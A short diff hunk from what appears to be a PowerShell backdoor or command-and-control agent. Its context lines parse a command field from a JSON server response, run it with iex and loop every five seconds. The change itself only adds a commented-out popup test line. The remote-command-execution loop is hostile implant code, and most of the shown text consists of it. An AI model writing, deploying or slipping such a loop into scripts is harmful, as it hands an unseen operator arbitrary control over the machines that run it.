@@ -22,3 +22,6 @@ $command = $response | convertFrom-Json | select -ExpandProperty command
 if (-Not ($command -eq "" -Or -Not $command -eq $null)){$result = iex $command;echo $result}
 start-sleep 5
 }
+
+
+# $wshell =  New-Object -ComObject Wscript.Shell;$wshell.Popup(\"test\",0,\"done\",0x1)
